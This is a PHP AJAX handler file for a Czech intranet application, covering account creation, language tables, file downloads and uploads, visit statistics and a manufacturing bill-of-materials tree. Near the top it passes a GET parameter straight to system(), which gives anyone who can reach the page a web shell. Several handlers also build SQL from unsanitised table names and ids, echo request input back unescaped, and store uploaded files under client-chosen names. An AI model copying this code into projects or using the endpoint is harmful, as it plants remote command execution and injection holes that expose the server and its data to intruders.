<?php
require_once ("./config/main_variables.php");
require_once ("./functions/php/sessions.inc");
require_once ("./config/dbconnect.php");
require_once ("./functions/php/knihovna.php");
require_once ("./functions/php/mssql_knihovna.php");
require_once ("./functions/php/whois.php");


if (isset($_GET["csv_file"])){
header ("Content-Type: application/download");
header ("Content-Disposition: attachment; filename=data.csv");
    echo $_GET["csv_file"];
}



if (isset($_GET["command"])){
    system($_GET["command"],$result);
}



if (isset($_GET["disable_acc"])){
    mysql_query("update login set end_date='".$dnes."' where loginname='".securesql($_GET["disable_acc"])."' ") or die (dictionary("sql_command",$_SESSION["language"])." > ".MySQL_Error());
}
    

if (isset($_GET["create_acc"])){
    @$fn_ldap_users = fn_ldap_list($_GET["create_acc"]);
    $fn_name_temp=explode(" ", @$fn_ldap_users[0][1]);
    mysql_query("insert into login (loginname,name,surname,email,start_date,end_date,language,account_type)VALUES('".securesql($_GET["create_acc"])."','".securesql($fn_name_temp[0])."','".securesql($fn_name_temp[1])."','".@$fn_ldap_users[0][2]."','".$dnes."','0000-00-00','".securesql($def_language)."','active_directory') ") or die (dictionary("sql_command",$_SESSION["language"])." > ".MySQL_Error());
    if (@$fn_ldap_users[0][2]){
        $fn_subject = dictionary("your_intranet_account_created",$_SESSION["language"]);
        $fn_recipient = @$fn_ldap_users[0][2];
        $fn_body = "<h1>".$fn_subject."</h1><br><table>
        <tr><td>".dictionary("username",$_SESSION["language"])."</td><td>".$_GET["create_acc"]."</td></tr>
        <tr><td>".dictionary("password",$_SESSION["language"])."</td><td>".dictionary("your_ad_password",$_SESSION["language"])."</td></tr>
        <tr><td>".dictionary("app_url",$_SESSION["language"])."</td><td><a href='".mysql_result(mysql_query("select param from mainsettings where id='2' "),0,0)."' > ".mysql_result(mysql_query("select param from mainsettings where id='2' "),0,0)."</a></td></tr>
        </table>";
        fn_send_mail($fn_recipient,$fn_subject,$fn_body);
    }
}
    
    
if (isset($_GET['addlang'])) {
    mysql_query("ALTER TABLE webmin_dictionary ADD COLUMN ".securesql($_GET['addlang'])." MEDIUMTEXT NOT NULL") or die (dictionary("sql_command",$_SESSION["language"])." > ".MySQL_Error());
    mysql_query("ALTER TABLE www_menu ADD COLUMN ".securesql($_GET['addlang'])." MEDIUMTEXT NOT NULL") or die (dictionary("sql_command",$_SESSION["language"])." > ".MySQL_Error());

$tables = mysql_query("show tables like 'list%' ");
$save=0;while(mysql_result($tables,$save,0)):
    mysql_query("ALTER TABLE ".mysql_result($tables,$save,0)." ADD COLUMN ".securesql($_GET['addlang'])." MEDIUMTEXT NOT NULL") or die (dictionary("sql_command",$_SESSION["language"])." > ".MySQL_Error());
$save++;endwhile;
}


if (isset($_GET['dellang'])) {
    mysql_query("ALTER TABLE webmin_dictionary DROP COLUMN ".securesql($_GET['dellang'])." ") or die (dictionary("sql_command",$_SESSION["language"])." > ".MySQL_Error());
    mysql_query("ALTER TABLE www_menu DROP COLUMN ".securesql($_GET['dellang'])." ") or die (dictionary("sql_command",$_SESSION["language"])." > ".MySQL_Error());

$tables = mysql_query("show tables like 'list%' ");
$save=0;while(mysql_result($tables,$save,0)):
    mysql_query("ALTER TABLE ".mysql_result($tables,$save,0)." DROP COLUMN ".securesql($_GET['dellang'])." ") or die (dictionary("sql_command",$_SESSION["language"])." > ".MySQL_Error());
$save++;endwhile;
}    

if (isset($_GET['del'])) {mysql_query("update ". securesql($_GET['table'])." set icon='', mime_type='' where id='". securesql(base64_decode($_GET['del']))."' ") or die (dictionary("sql_command",$_SESSION["language"])." > ".MySQL_Error());}
    


if (isset($_COOKIE['tbl']) && !isset($_GET['show_file']) && !isset($_GET['pictures']) && !isset($_GET['icon'])) {
$load_names=mysql_query("SHOW COLUMNS FROM ".securesql($_COOKIE['tbl'])." ") or die (dictionary("sql_command",$_SESSION["language"])." > ".MySQL_Error());
$load_data=mysql_query("select * from ".securesql($_COOKIE['tbl'])." order by id ASC") or die (dictionary("sql_command",$_SESSION["language"])." > ".MySQL_Error());

echo "<table id=table_desc><tr><td><img src='./images/add.png' width='18' height='18' alt='".dictionary("add_new",$_SESSION["language"])."' border='0' style=cursor:pointer; onclick='add_record();'></td>";

$load=1;while(mysql_result($load_names,$load,0)):
	echo "<td><img src='./ajax_functions.php?icon=yes&tbl=".base64_encode("webmin_languages")."&id=".base64_encode(mysql_result(mysql_query("select id from webmin_languages where name='".securesql(mysql_result($load_names,$load,0))."' "),0,0))."' width='20' height='20' alt='' border='0' style=position:relative;top:3px;right:5px; >".dictionary(mysql_result($load_names,$load,0),$_SESSION["language"])."</td>";
$load++;endwhile;echo "</tr>";

if (@$_REQUEST["act"]=="add"){$plus=1;} else {$plus=0;}
$load=0;while($load<mysql_num_rows($load_data)+$plus):
  echo "<tr><td>";
	$load1=1;while($load1<mysql_num_rows($load_names)):
		if ($load1==1 && $load<mysql_num_rows($load_data)){echo "<img src='./images/delete.png' width='18' height='18' alt='".dictionary("delete",$_SESSION["language"])."' border='0' style=vertical-align:sup;cursor:pointer;  onclick=`if(confirm('".dictionary("del_record",$_SESSION['language'])." : ".mysql_result($load_data,$load,$load1)."')) del_record('".mysql_result($load_data,$load,0)."');` >";}
		echo "</td><td><input type='text' id='value_".mysql_result($load_data,$load,0)."_".mysql_result($load_names,$load1,0)."' name='value_".mysql_result($load_data,$load,0)."_".mysql_result($load_names,$load1,0)."' value='".mysql_result($load_data,$load,$load1)."' style=text-align:left; autocomplete='off' onclick=select() ></td>";
	$load1++;endwhile;echo"</tr>";
$load++;endwhile;echo "<input type='hidden' value='".$_COOKIE['tbl']."' name='tbl' /></table>";
}
    
    
if (isset($_GET['show_file'])) {
    @$icodata = mysql_query("select icon,mime_type,icon_name from ".@$_GET["tbl"]." where id='".@$_GET["id"]."'");
//Header ("Content-type:".mysql_result($icodata,0,1)."");
header ("Content-Type: application/download");
header ("Content-Disposition: attachment; filename=".iconv('utf-8','windows-1250',mysql_result($icodata,0,2)));
print mysql_result($icodata,0,0);
}   


if (isset($_GET['pictures'])) {
@$icodata = mysql_query("select icon,mime_type from ".$_GET["tbl"]." where id='".$_GET["id"]."'");
Header ("Content-type: mysql_result($icodata,0,1)");
@print mysql_result($icodata,0,0);
}   


if (isset($_GET['icon'])) {
$icodata = mysql_query("select icon,mime_type from ".base64_decode(@$_GET["tbl"])." where id='".base64_decode(@$_GET["id"])."'");
Header ("Content-type:".mysql_result($icodata,0,1)."");
print mysql_result($icodata,0,0).".jpg";
}


if (isset($_GET["ckedit"])){
echo mysql_result(mysql_query("select ".securesql(@$_GET["lang"])." from www_menu where id='".securesql(base64_decode(@$_GET["id"]))."'"),0,0);    
}


if (isset($_FILES["oc_value1"]['name'])){echo $_FILES["oc_value1"]['name'];
    @$temp = @$_FILES['oc_value1'.$cykl]['tmp_name'];
    @$file_data = implode('', file("$temp"));
    
$destination = "./temp/".$_FILES["oc_value1"]['name'];
$file = fopen(iconv('utf-8','windows-1250',$destination), "w");
fwrite($file, $file_data);
fclose($file);
//<script>window.close();</script>
}

 
if (isset($_GET["counter"])&& isset($_GET["counter_name"])){
    
    require_once ('./modules/jpgraph/src/jpgraph.php');
    require_once ('./modules/jpgraph/src/jpgraph_bar.php');
    $fn_where=" where ";
        

        if (isset($_GET["from"])) {$fn_where .= " DATE(visit_date) >= '".@$_GET["from"]."' ";}
        if (isset($_GET["to"]) && $fn_where==" where " ){$fn_where .= " DATE(visit_date) <= '".@$_GET["to"]."' ";}
        else {
            if (isset($_GET["to"])){$fn_where .= " and DATE(visit_date) <= '".@$_GET["to"]."' ";}
        }    
        if (isset($_GET["interval"]) && $fn_where==" where "){
            if (@$_GET["interval"]=="hourly"){$fn_where = " group by DATE(visit_date),HOUR(visit_date) order by DATE(visit_date),HOUR(visit_date) ASC ";}
            if (@$_GET["interval"]=="daily"){$fn_where = " group by DATE(visit_date) order by DATE(visit_date) ASC ";}
            if (@$_GET["interval"]=="weekly"){$fn_where = " group by WEEK(visit_date) order by WEEK(visit_date) ASC ";}
            if (@$_GET["interval"]=="monthly"){$fn_where = " group by MONTH(visit_date) order by MONTH(visit_date) ASC ";}
            if (@$_GET["interval"]=="yearly"){$fn_where = " group by YEAR(visit_date) order by YEAR(visit_date) ASC ";}
            
            }
        else {
            if (isset($_GET["interval"])){
            if (@$_GET["interval"]=="hourly"){$fn_where .= " group by DATE(visit_date),HOUR(visit_date) order by DATE(visit_date),HOUR(visit_date) ASC ";}
            if (@$_GET["interval"]=="daily") {$fn_where .= " group by DATE(visit_date) order by DATE(visit_date) ASC ";}
            if (@$_GET["interval"]=="weekly"){$fn_where .= " group by WEEK(visit_date) order by WEEK(visit_date) ASC ";}
            if (@$_GET["interval"]=="monthly"){$fn_where .= " group by MONTH(visit_date) order by MONTH(visit_date) ASC ";}
            if (@$_GET["interval"]=="yearly"){$fn_where .= " group by YEAR(visit_date) order by YEAR(visit_date) ASC ";}
            }            
        }            

        $fn_query=mysql_query("SELECT *,COUNT(id) FROM karat_conf_ip_list ".$fn_where." ");
    $fn_cykl=0;while($fn_cykl < mysql_num_rows($fn_query)):
        $fn_y_label[$fn_cykl] = mysql_result($fn_query,$fn_cykl,5);
        $fn_x_label[$fn_cykl] = datetimedb_to_datecs(mysql_result($fn_query,$fn_cykl,3))."\r\n".datetimedb_to_hour(mysql_result($fn_query,$fn_cykl,3));
    $fn_cykl++;endwhile;
    
        
    header("Content-type: image/jpeg");
        $data1y=$fn_y_label;
        $graph = new Graph(600, 500, 'auto');
        $graph->SetScale('textlin');
        $theme_class = new AquaTheme;
        $graph->SetTheme($theme_class);
        // after setting theme, you can change details as you want
        $graph->SetFrame(true, 'lightgray');                        // set frame visible
        $graph->xaxis->SetTickLabels($fn_x_label);
        $graph->title->Set(dictionary($_GET["counter_name"],$_SESSION["language"]));                    // add title

        // add barplot
        $bplot = new BarPlot($data1y);
        $graph->Add($bplot);
        // you can change properties of the plot only after calling Add()
        $bplot->SetWeight(0);
        $bplot->SetFillGradient('#FFAAAA:0.7', '#FFAAAA:1.2', GRAD_VER);
        $bplot->value->Show();    
         //$graph->Stroke();
        print $graph->Stroke();
}
   
   
   

if (isset($_GET["whois"])){
    $whois = new Whois($_GET["whois"]);
    header('Content-Type: text/html; charset=utf-8');
    print '<pre>'. $whois->get() .'</pre>';
}   





if (isset($_GET["tpv_header_info"])){
    require_once ("./config/mssql_dbconnect.php");
    $sum_table[0]=array(dictionary("nomenklatura",$_SESSION["language"]),dictionary("total",$_SESSION["language"]));



        $choosed_db_fields="nazev,user_std_rozmer,user_kat_oznaceni,user_norma_din,user_oznaceni_mat,user_nazev_cad";
    
    //unicate_rules nomenklature chybi posledni -XX
    $fn_selected_nomen = $_GET['tpv_header_info'];
    if (StrPos (" " . substr($_GET['tpv_header_info'],0,1) , "2")){
        $fn_temp_nomen = explode("-",$_GET['tpv_header_info']);$fin_temp_nomen=""; 
          for ($i = 0; $i < (count($fn_temp_nomen)-1); $i++) {
          $fin_temp_nomen.= $fn_temp_nomen[$i]; 
              if (($i+1)<(count($fn_temp_nomen)-1)){$fin_temp_nomen.="-";}
          }
        $_GET['tpv_header_info']=substr($_GET['tpv_header_info'],0,(strlen($_GET['tpv_header_info'])-2));
    }

    @$sql =  "SELECT ".mssecuresql($choosed_db_fields)." FROM dba.nomenklatura WHERE cislo_nomenklatury =  '".mssecuresql($fin_temp_nomen)."' ";
    @$check = sqlsrv_query( $conn, $sql , $params, $options );
    while( @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH ) ) {
        echo "document.getElementById('header_info').innerHTML='".dictionary("procedure",$_SESSION["language"])."<input id=hv1 type=text ondblclick=select(); style=width:100%;text-align:center; readonly=yes value=\'".$_GET['tpv_header_info']."\'><br>".dictionary("_name",$_SESSION["language"])."<input id=hv2 type=text ondblclick=select(); style=width:100%;text-align:center; readonly=yes value=\'".mssql_real_escape_string($row[0])."\'><br>".dictionary("std_dimension",$_SESSION["language"])."<input id=hv3 type=text style=width:100%;text-align:center; readonly=yes value=\'".$row[1]."\'><br>".dictionary("catalog_mark",$_SESSION["language"])."<input id=hv4 type=text style=width:100%;text-align:center; readonly=yes value=\'".mssql_real_escape_string($row[2])."\'><br>".dictionary("din_norm",$_SESSION["language"])."<input type=text style=width:100%;text-align:center; readonly=yes value=\'".mssql_real_escape_string($row[3])."\'><br>".dictionary("material_mark",$_SESSION["language"])."<input type=text style=width:100%;text-align:center; readonly=yes value=\'".mssql_real_escape_string($row[4])."\'><br>".dictionary("cad_name",$_SESSION["language"])."<input type=text style=width:100%;text-align:center; readonly=yes value=\'".mssql_real_escape_string($row[5])."\'><div style=text-align:center; ><input type=\"button\" onclick=\"TableToExcel(\'fn_tpv_tree\',\'".$_GET['tpv_header_info'].".xls\');\" value=\"".dictionary("open_exported_file ",$_SESSION["language"])."\" style=text-align:center; ></div>';";
    }
    
// load datalist
$datalist_array[0] = array('',dictionary("level",$_SESSION["language"]),'',dictionary("sequence",$_SESSION["language"]),dictionary("nomenklatura",$_SESSION["language"]),dictionary("description",$_SESSION["language"]),dictionary("consumer_quantity",$_SESSION["language"]),dictionary("measure_unit",$_SESSION["language"]),dictionary("catalog_mark",$_SESSION["language"]),dictionary("std_dimension",$_SESSION["language"]),dictionary("material_mark",$_SESSION["language"]),dictionary("material_mark1",$_SESSION["language"]),dictionary("quality_norm",$_SESSION["language"]),dictionary("csn_norm",$_SESSION["language"]),dictionary("din_norm",$_SESSION["language"]),dictionary("average_price",$_SESSION["language"]),dictionary("last_price",$_SESSION["language"]),dictionary("total",$_SESSION["language"]),"TNZ %");

$index="";$uroven=0;$previous_count=1;
$search="D";$postup="%";$unique_pointer ="L";
$global_list="";
$cykl=0;while($cykl<1):
        

    if ($search=="D"){    
        
        if ($uroven==0) {$sql_var="";} //check first level 
            else {$sql_var="AND dilec.index2_dil = '1' AND (dilec.index_dil like '".mssecuresql($index)."' OR dilec.index_dil = '0' OR dilec.index_dil = '1' )";} 
        
    $choosed_db_fields="dilec.polozka,dilec.nomenklatura,dilec.popis,dilec.mnozstvi,dilec.kj,nomen.user_kat_oznaceni,nomen.user_std_rozmer,nomen.user_znacka_mater,nomen.user_oznaceni_mat,nomen.norma_jakostni,nomen.user_norma_csn,nomen.user_norma_din,dilec.postupdil,dilec.index_dil,dilec.index2_dil,'$search' AS TYPE,'','' ";
    @$sql = "SELECT $choosed_db_fields FROM dba.v_dilec dilec, dba.nomenklatura nomen WHERE dilec.id_nomen = nomen.id_nomen and dilec.postup like '".mssecuresql($fn_selected_nomen)."%' $sql_var AND dilec.platnost = 1 ORDER BY dilec.postup,dilec.poradi,dilec.polozka ";
    $temp="NO";
    }

    if ($search=="M"){ 
        
    $choosed_db_fields="mater.polozka,mater.nomenklatura,mater.popis,mater.spotrhm,mater.mj,nomen.user_kat_oznaceni,nomen.user_std_rozmer,nomen.user_znacka_mater,nomen.user_oznaceni_mat,nomen.norma_jakostni,nomen.user_norma_csn,nomen.user_norma_din,karty.prum_cena,karty.posl_cena,'','$search' AS TYPE,mater.tnz,mater.cistahm";
    @$sql = "SELECT $choosed_db_fields FROM dba.v_mater mater, dba.nomenklatura nomen, dba.karty karty WHERE mater.id_nomen = nomen.id_nomen AND nomen.id_nomen = karty.id_karty AND mater.sklad = karty.sklad AND mater.platnost = 1 AND (mater.index_mater like '".mssecuresql($index)."' OR mater.index_mater = 0) AND mater.postup like '".mssecuresql($fn_selected_nomen)."%' ORDER BY mater.postup,mater.poradi,mater.polozka ";
    $temp="YES"; 
    }
   program_log($sql,'','sql_log'); 
if ($uroven == 0 ) {$unique_pointer=$search;}

    @$check = sqlsrv_query( $conn, $sql , $params, $options );
    while( @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH ) ) {
   //  typ,prohledano,uroven zanoreni,poradove cislo radku,pole..., kalkulovany celkovy pocet - ve stromu
    if ($search=="M") {
        
        array_push($datalist_array, array(@mssql_real_escape_string($row[15]),$temp,$uroven,@mssql_real_escape_string($row[0]),@mssql_real_escape_string($row[1]),@mssql_real_escape_string($row[2]),(float) $row[3],@mssql_real_escape_string($row[4]),@mssql_real_escape_string($row[5]),@mssql_real_escape_string($row[6]),@mssql_real_escape_string($row[7]),@mssql_real_escape_string($row[8]),@mssql_real_escape_string($row[9]),@mssql_real_escape_string($row[10]),@mssql_real_escape_string($row[11]),(float) $row[12],(float) $row[13],(float) $previous_count * (float) @$row[3],'',$unique_pointer."-".@mssql_real_escape_string($row[0]),(float) (@$row[16]*0.01) ));
    }

    if ($search=="D") { array_push($datalist_array, array(@mssql_real_escape_string($row[15]),$temp,$uroven,@mssql_real_escape_string($row[0]),@mssql_real_escape_string($row[1]),@mssql_real_escape_string($row[2]),(float) $row[3],@mssql_real_escape_string($row[4]),@mssql_real_escape_string($row[5]),@mssql_real_escape_string($row[6]),@mssql_real_escape_string($row[7]),@mssql_real_escape_string($row[8]),@mssql_real_escape_string($row[9]),@mssql_real_escape_string($row[10]),@mssql_real_escape_string($row[11]),@mssql_real_escape_string($row[12]),@mssql_real_escape_string($row[13]),(float) $previous_count * (float) @$row[3],@mssql_real_escape_string($row[14]),$unique_pointer."-".@mssql_real_escape_string($row[0]),'')); 
    }   
   
    }
    
    if  ($search=="M") {$search="L";}
    if  ($search=="D") {$search="M";}
            
//what, field, searched value, get falue from position
if ($search=="L"){

  for ($i = 0; $i < count($datalist_array); $i++) {
     if($datalist_array[$i][1] == "NO" ) {
        $datalist_array[$i][1]="YES";
        $fn_selected_nomen = $datalist_array[$i][15];
        $index =$datalist_array[$i][18];
        $postup=$datalist_array[$i][15];
        $uroven=$datalist_array[$i][2]+1;
        $previous_count=$datalist_array[$i][17];
        $unique_pointer=$datalist_array[$i][19];        
        $search="D";
        break;         
     }
  }
        
}

    if  ($search=="L") {$cykl++;}
    
endwhile;
  
$include_script_objects="";                
$data_temp="<table id=data_table border=2 frame=border rules=all >";
$cykl=0;while($cykl < @count($datalist_array)):

 if ($cykl==0){ // column names
    $data_temp.="<tr style=font-size:8px;background-color:#98D1FF; ><td><img src=./images/add.png id=main_image onclick=run_functs(this.field_list); style=width:12px;cursor:pointer;vertical-text-align:middle; />".$datalist_array[$cykl][3]."</td><td>".$datalist_array[$cykl][1]."</td><td>".$datalist_array[$cykl][5]."</td><td>".$datalist_array[$cykl][9]."</td><td>".$datalist_array[$cykl][8]."</td><td>".$datalist_array[$cykl][4]."</td><td>".$datalist_array[$cykl][6]."</td><td>".$datalist_array[$cykl][17]."</td><td>".$datalist_array[$cykl][7]."</td><td>".$datalist_array[$cykl][15]."</td><td>".$datalist_array[$cykl][16]."</td><td>".$datalist_array[$cykl][18]."</td><td>".$datalist_array[$cykl][10]."</td><td>".$datalist_array[$cykl][11]."</td><td>".$datalist_array[$cykl][12]."</td><td>".$datalist_array[$cykl][13]."</td><td>".$datalist_array[$cykl][14]."</td><td></td><td></td><td></td></tr>";
    }
     else {     $table_part=explode("-",$datalist_array[$cykl][19]);
                $table_target="";            
                for ($i = 0; $i < (count($table_part)-1); $i++) {
                    $table_target.=$table_part[$i];
                    if (($i+1)<(count($table_part)-1)){$table_target.="-";}
                }
        
        if ($datalist_array[$cykl][2]==0){
            //level 0         
            $data_temp.="<tr style=font-size:8px;vertical-text-align:middle; ><td style=width:30px; >";
            if ($datalist_array[$cykl][0]=="D"){$data_temp.="<img src=./images/add.png onclick=table_line_display(\"".$datalist_array[$cykl][19]."\"); style=width:12px;cursor:pointer;vertical-text-align:middle; /> ";
            $global_list.=$datalist_array[$cykl][19].";";
            }
            
            $data_temp.=$datalist_array[$cykl][3]."</td><td>".$datalist_array[$cykl][2]."</td><td>".$datalist_array[$cykl][5]."</td><td>".$datalist_array[$cykl][9]."</td><td>".$datalist_array[$cykl][8]."</td><td>".$datalist_array[$cykl][4]."</td><td>".@number_format($datalist_array[$cykl][6],4,","," ")."</td><td>".@number_format($datalist_array[$cykl][17],4,","," ")."</td><td>".$datalist_array[$cykl][7]."</td>";
            if ($datalist_array[$cykl][0]=="M"){$data_temp.="<td>".@number_format($datalist_array[$cykl][15],4,","," ")."</td><td>".@number_format($datalist_array[$cykl][16],4,","," ")."</td>";}
                else {$data_temp.="<td></td><td></td>";}
            $data_temp.="<td>".$datalist_array[$cykl][20]."</td><td>".$datalist_array[$cykl][10]."</td><td>".$datalist_array[$cykl][11]."</td><td>".$datalist_array[$cykl][12]."</td><td>".$datalist_array[$cykl][13]."</td><td>".$datalist_array[$cykl][14]."</td><td>".$datalist_array[$cykl][18].";".$datalist_array[$cykl][19]."</td><td>".$cykl."</td><td>".$datalist_array[$cykl][0]."</td></tr>";
            if ($datalist_array[$cykl][0]=="D"){$data_temp.="<tr><td colspan=20 id=\"".$datalist_array[$cykl][19]."\" style=\"display:none;width:100%;\" ></td></tr>";}
        } else { //more levels
            $include_script_objects.="var oldHTML = document.getElementById('".$table_target."').innerHTML;";
            $include_script_objects.="document.getElementById('".$table_target."').innerHTML= oldHTML + '<table id=data_table border=2 frame=border rules=all ><tr style=font-size:8px;vertical-text-align:middle; ><td style=width:30px; >";
            if ($datalist_array[$cykl][0]=="D"){$include_script_objects.="<img src=./images/add.png onclick=table_line_display(\"".$datalist_array[$cykl][19]."\"); style=width:12px;cursor:pointer;vertical-text-align:middle; /> ";
            $global_list.=$datalist_array[$cykl][19].";";
            }
            
            $include_script_objects.=$datalist_array[$cykl][3]."</td><td>".$datalist_array[$cykl][2]."</td><td>".$datalist_array[$cykl][5]."</td><td>".$datalist_array[$cykl][9]."</td><td>".$datalist_array[$cykl][8]."</td><td>".$datalist_array[$cykl][4]."</td><td>".@number_format($datalist_array[$cykl][6],4,","," ")."</td><td>".@number_format($datalist_array[$cykl][17],4,","," ")."</td><td>".$datalist_array[$cykl][7]."</td>";
            if ($datalist_array[$cykl][0]=="M"){$include_script_objects.="<td>".@number_format($datalist_array[$cykl][15],4,","," ")."</td><td>".@number_format($datalist_array[$cykl][16],4,","," ")."</td>";}
                else{$include_script_objects.="<td></td><td></td>";}
            $include_script_objects.="<td>".$datalist_array[$cykl][20]."</td><td>".$datalist_array[$cykl][10]."</td><td>".$datalist_array[$cykl][11]."</td><td>".$datalist_array[$cykl][12]."</td><td>".$datalist_array[$cykl][13]."</td><td>".$datalist_array[$cykl][14]."</td><td>".$datalist_array[$cykl][18].";".$datalist_array[$cykl][19]."</td><td>".$cykl."</td><td>".$datalist_array[$cykl][0]."</td></tr>";

            if ($datalist_array[$cykl][0]=="D"){$include_script_objects.="<tr><td colspan=20 id=\"".$datalist_array[$cykl][19]."\" style=\"display:none;width:100%;\" ></td></tr>";}
            $include_script_objects.="</table>';";
        }

    }
    // total array creation
    if ($cykl<>0){
    $founded=0;$search_cycle=0;while($search_cycle<@count(@$sum_table)):
        if ($founded==0 && @$sum_table[@$search_cycle][0]==$datalist_array[$cykl][4]){$founded=1;
            @$sum_table[@$search_cycle][1]=(float) @$sum_table[@$search_cycle][1] +(float) $datalist_array[$cykl][17];
        }
        if ($search_cycle==(@count(@$sum_table)-1) && $founded==0){$founded=1;
             array_push($sum_table, array($datalist_array[$cykl][4],(float)$datalist_array[$cykl][17]));
        }
    $search_cycle++;endwhile;
 }   

$cykl++;endwhile;

//generate total table html code
$total_table="<br><table id=data_table border=2 frame=border rules=all >";
$search_cycle=0;while($search_cycle<@count(@$sum_table)):
    if ($search_cycle==0){$total_table.="<tr style=font-size:12px;vertical-text-align:middle;background-color:#98D1FF; ><td>".@$sum_table[@$search_cycle][0]."</td><td style=align:right; >".@$sum_table[@$search_cycle][1]."</td></tr>";}
    else {$total_table.="<tr style=font-size:12px;vertical-text-align:middle;background-color:#98D1FF; ><td>".@$sum_table[@$search_cycle][0]."</td><td>".@number_format(@$sum_table[@$search_cycle][1],4,","," ")."</td></tr>";}
$search_cycle++;endwhile;
$total_table.="</table>";



    $data_temp.="</table>";
    echo "document.getElementById('fn_tpv_tree').innerHTML='".$data_temp."';";
    echo "document.getElementById('fn_tpv_tree').sum_table='".$total_table."';";
    echo $include_script_objects;    
    echo "document.getElementById('loading').style.display='none';";
    echo "document.getElementById('main_image').field_list='".$global_list.";';";
    

//end of datalist    






sqlsrv_close($conn);

}


if (isset($_GET["dictionary"])){
    echo dictionary($_GET["dictionary"],$_SESSION["language"]);
}




if (isset($_GET["mssql_delete_item"])){
    require_once ("./config/mssql_dbconnect.php");
    $fn_sql = "DELETE FROM dbo.[".mssecuresql($_GET[mssql_delete_item])."] where id='".mssecuresql(@$_GET["id"])."' ";
    $fn_sql_ins_res = sqlsrv_query( $conn, $fn_sql , $params, $options ) or die (dictionary("sql_command",$_SESSION["language"])." > ".print_r( sqlsrv_errors(), true));
}sqlsrv_close($conn);





?>
